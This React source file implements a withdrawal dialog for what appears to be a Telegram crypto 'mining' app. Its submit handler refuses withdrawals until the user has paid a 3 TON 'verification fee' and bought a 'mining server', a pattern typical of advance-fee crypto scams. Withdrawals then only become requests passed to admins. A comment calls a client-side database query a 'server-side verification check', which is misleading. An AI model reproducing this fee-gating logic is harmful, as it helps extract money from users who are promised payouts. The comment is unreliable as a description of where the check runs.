import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Loader2, AlertCircle, Check, ArrowUpRight, X } from 'lucide-react';
import { TonIcon, UsdtIcon } from '@/components/ui/currency-icons';

interface WithdrawModalProps {
  open: boolean;
  onClose: () => void;
  userId: string;
  currency: 'TON' | 'USDT';
  balance: number;
  onSuccess?: () => void;
}

const MIN_WITHDRAWALS = {
  TON: 1,
  USDT: 5,
};

const WithdrawModal: React.FC<WithdrawModalProps> = ({
  open,
  onClose,
  userId,
  currency,
  balance,
  onSuccess,
}) => {
  const [amount, setAmount] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [success, setSuccess] = useState(false);

  const minAmount = MIN_WITHDRAWALS[currency];
  const numAmount = parseFloat(amount) || 0;
  const isValidAmount = numAmount >= minAmount && numAmount <= balance;
  const isValidWallet = walletAddress.trim().length > 10;

  const handleSubmit = async () => {
    if (!isValidAmount || !isValidWallet) return;

    setIsSubmitting(true);
    try {
      // CRITICAL: Server-side verification check before allowing withdrawal
      // Check if user has paid 3 TON verification fee
      const { data: verificationData, error: verificationError } = await supabase
        .from('wallet_verifications')
        .select('id, verification_fee')
        .eq('user_id', userId)
        .gte('verification_fee', 3)
        .limit(1);

      if (verificationError || !verificationData || verificationData.length === 0) {
        toast.error('Wallet verification required. Please pay 3 TON verification fee first.');
        setIsSubmitting(false);
        onClose();
        return;
      }

      // Check if user has an active mining server
      const { count: serverCount } = await supabase
        .from('user_servers')
        .select('*', { count: 'exact', head: true })
        .eq('user_id', userId)
        .eq('is_active', true);

      if (!serverCount || serverCount === 0) {
        toast.error('Server required. Please purchase a mining server first.');
        setIsSubmitting(false);
        onClose();
        return;
      }

      const { data: userData } = await supabase
        .from('bolt_users')
        .select('telegram_username, first_name, telegram_id')
        .eq('id', userId)
        .single();

      const { error } = await supabase.from('withdrawal_requests').insert({
        user_id: userId,
        currency,
        amount: numAmount,
        wallet_address: walletAddress.trim(),
      });

      if (error) throw error;

      try {
        await supabase.functions.invoke('notify-admin-withdrawal', {
          body: {
            userId,
            username: userData?.telegram_username || userData?.first_name || 'Unknown',
            telegramId: userData?.telegram_id,
            currency,
            amount: numAmount,
            walletAddress: walletAddress.trim(),
          },
        });
      } catch (notifyError) {
        console.error('Failed to notify admins:', notifyError);
      }

      setSuccess(true);
      toast.success('Withdrawal request submitted');
      
      setTimeout(() => {
        onSuccess?.();
        handleClose();
      }, 2000);
    } catch (error) {
      console.error('Withdrawal error:', error);
      toast.error('Failed to submit withdrawal request');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleClose = () => {
    setAmount('');
    setWalletAddress('');
    setSuccess(false);
    onClose();
  };

  const handleMaxClick = () => {
    setAmount(balance.toString());
  };

  const CurrencyIcon = currency === 'TON' ? <TonIcon size={36} /> : <UsdtIcon size={36} />;

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent className="max-w-sm border-0 bg-background p-0 gap-0" hideCloseButton>
        {/* Header */}
        <div className="flex items-center justify-between p-4 border-b border-border">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-orange-500/10 flex items-center justify-center">
              <ArrowUpRight className="w-5 h-5 text-orange-500" />
            </div>
            <span className="font-semibold text-foreground">Withdraw {currency}</span>
          </div>
          <button onClick={handleClose} className="text-muted-foreground">
            <X className="w-5 h-5" />
          </button>
        </div>

        <AnimatePresence mode="wait">
          {success ? (
            <motion.div
              key="success"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="py-12 text-center px-6"
            >
              <div className="w-16 h-16 rounded-full bg-green-500/10 flex items-center justify-center mx-auto mb-4">
                <Check className="w-8 h-8 text-green-500" />
              </div>
              <h3 className="text-lg font-semibold text-foreground mb-1">Request Submitted</h3>
              <p className="text-sm text-muted-foreground">
                Your withdrawal is being processed
              </p>
            </motion.div>
          ) : (
            <motion.div
              key="form"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="p-6 space-y-5"
            >
              {/* Currency Display */}
              <div className="flex items-center justify-center gap-2">
                {CurrencyIcon}
                <span className="text-lg font-semibold text-foreground">{currency}</span>
              </div>

              {/* Balance Info */}
              <div className="flex items-center justify-between p-3 rounded-xl bg-muted/20">
                <span className="text-sm text-muted-foreground">Available</span>
                <span className="font-semibold text-foreground">{balance.toLocaleString()} {currency}</span>
              </div>

              {/* Amount Input */}
              <div>
                <div className="relative">
                  <Input
                    type="number"
                    placeholder={`Min: ${minAmount}`}
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="h-12 pr-16 bg-muted/30 border-0"
                    min={minAmount}
                    max={balance}
                    step="any"
                  />
                  <button
                    type="button"
                    onClick={handleMaxClick}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-medium text-primary"
                  >
                    MAX
                  </button>
                </div>
                {numAmount > 0 && numAmount < minAmount && (
                  <p className="text-xs text-destructive flex items-center gap-1 mt-2">
                    <AlertCircle className="w-3 h-3" />
                    Minimum is {minAmount} {currency}
                  </p>
                )}
                {numAmount > balance && (
                  <p className="text-xs text-destructive flex items-center gap-1 mt-2">
                    <AlertCircle className="w-3 h-3" />
                    Insufficient balance
                  </p>
                )}
              </div>

              {/* Wallet Address Input */}
              <div>
                <Input
                  type="text"
                  placeholder={`${currency} wallet address`}
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="h-12 bg-muted/30 border-0"
                />
              </div>

              {/* Notice */}
              <p className="text-xs text-center text-muted-foreground">
                Withdrawals are processed within 24-48 hours
              </p>

              {/* Submit Button */}
              <Button
                onClick={handleSubmit}
                disabled={!isValidAmount || !isValidWallet || isSubmitting}
                className="w-full h-12 bg-orange-500 hover:bg-orange-600 text-white"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Processing...
                  </>
                ) : (
                  `Withdraw ${numAmount > 0 ? numAmount.toLocaleString() : ''} ${currency}`
                )}
              </Button>
            </motion.div>
          )}
        </AnimatePresence>
      </DialogContent>
    </Dialog>
  );
};

export default WithdrawModal;
